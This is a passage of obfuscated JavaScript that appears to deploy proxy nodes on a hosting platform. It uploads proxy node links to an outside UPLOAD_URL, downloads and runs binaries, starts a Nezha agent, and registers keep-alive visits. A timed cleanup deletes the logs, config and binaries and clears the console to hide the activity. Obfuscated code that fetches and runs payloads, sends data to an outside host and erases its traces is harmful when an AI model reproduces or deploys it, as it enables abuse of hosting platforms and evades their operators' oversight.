axios[_0x51185c(0x23c)](UPLOAD_URL+_0x51185c(0x232),_0x5d2709,{'headers':{'Content-Type':_0x51185c(0x256)}});return _0x4db563&&_0x4db563[_0x51185c(0x248)]===0xc8?(console[_0x51185c(0x255)](_0x51185c(0x250)),_0x4db563):null;}catch(_0x1464e3){if(_0x1464e3[_0x51185c(0x274)]){if(_0x1464e3[_0x51185c(0x274)][_0x51185c(0x248)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x51185c(0x28b)](listPath))return;const _0x566242=fs[_0x51185c(0x20f)](listPath,'utf-8'),_0x348488=_0x566242[_0x51185c(0x1c4)]('\x0a')['filter'](_0x3f2177=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x51185c(0x253)](_0x3f2177));if(_0x348488[_0x51185c(0x1e5)]===0x0)return;const _0xecc87=JSON[_0x51185c(0x1eb)]({'nodes':_0x348488});try{const _0x226db6=await axios['post'](UPLOAD_URL+_0x51185c(0x1c3),_0xecc87,{'headers':{'Content-Type':'application/json'}});return _0x226db6&&_0x226db6['status']===0xc8?(console[_0x51185c(0x255)](_0x51185c(0x21a)),_0x226db6):null;}catch(_0x3bf589){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x594f61=_0x22e1,_0x4fd46=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4fd46['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4fd46['push'](phpPath);process[_0x594f61(0x291)]==='win32'?exec(_0x594f61(0x28a)+_0x4fd46[_0x594f61(0x263)]('\x20')+_0x594f61(0x1e1),_0x44ba7a=>{const _0x562db7=_0x594f61;console['clear'](),console[_0x562db7(0x255)](_0x562db7(0x26c)),console[_0x562db7(0x255)](_0x562db7(0x23f));}):exec(_0x594f61(0x1fd)+_0x4fd46[_0x594f61(0x263)]('\x20')+'\x20>/dev/null\x202>&1',_0x4c3b2f=>{const _0x57a18b=_0x594f61;console[_0x57a18b(0x23a)](),console['log'](_0x57a18b(0x26c)),console[_0x57a18b(0x255)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x20eb4c=_0x2bdeaa;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x20eb4c(0x255)](_0x20eb4c(0x23d));return;}try{const _0x4c9451=await axios[_0x20eb4c(0x23c)](_0x20eb4c(0x26b),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x20eb4c(0x256)}});return console[_0x20eb4c(0x255)](_0x20eb4c(0x1cf)),_0x4c9451;}catch(_0xe0cf0b){return console[_0x20eb4c(0x1e8)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0xe0cf0b[_0x20eb4c(0x1f8)]),null;}}async function startserver(){const _0x290a61=_0x2bdeaa;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1db3a8){console[_0x290a61(0x1e8)]('Error\x20in\x20startserver:',_0x1db3a8);}}startserver()[_0x2bdeaa(0x1ff)](_0x56f11b=>{const _0x2d476f=_0x2bdeaa;console[_0x2d476f(0x1e8)]('Unhandled\x20error\x20in\x20startserver:',_0x56f11b);}),app[_0x2bdeaa(0x204)]('/',async function(_0xd9bed5,_0x1edbf9){const _0x2414fc=_0x2bdeaa;try{const _0x35f845=path['join'](__dirname,_0x2414fc(0x240)),_0x2323bc=await fs[_0x2414fc(0x283)]['readFile'](_0x35f845,_0x2414fc(0x24f));_0x1edbf9[_0x2414fc(0x276)](_0x2323bc);}catch(_0x4db8b8){_0x1edbf9[_0x2414fc(0x276)](_0x2414fc(0x20e));}}),app[_0x2bdeaa(0x281)](PORT,()=>console[_0x2bdeaa(0x255)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
